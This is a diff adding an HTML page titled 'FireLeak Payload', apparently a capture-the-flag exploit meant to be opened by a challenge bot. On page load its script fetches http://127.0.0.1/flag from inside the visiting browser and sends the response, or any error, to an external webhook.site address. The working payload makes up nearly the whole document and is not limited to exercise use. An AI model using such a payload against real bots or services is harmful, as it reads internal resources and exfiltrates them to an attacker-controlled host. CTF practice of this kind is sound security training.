@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>FireLeak Payload</title>
+  </head>
+  <body>
+    <h1>FireLeak payload</h1>
+    <p>If you see this in your own browser, nothing special will happen. The magic is when the CTF bot opens it.</p>
+
+    <script>
+      (async () => {
+        try {
+          // Try to fetch the flag from localhost inside the bot
+          const res = await fetch("http://127.0.0.1/flag");
+          const text = await res.text();
+
+          // Exfiltrate flag to your webhook.site URL
+          await fetch("https://webhook.site/0a50545c-f10c-4616-8f13-ee183b1a96d7?" + 
+            new URLSearchParams({ data: text })
+          );
+        } catch (e) {
+          // Send error as well so you can debug if it fails
+          await fetch("https://webhook.site/0a50545c-f10c-4616-8f13-ee183b1a96d7?" + 
+            new URLSearchParams({ error: String(e) })
+          );
+        }
+      })();
+    </script>
+  </body>
+</html>
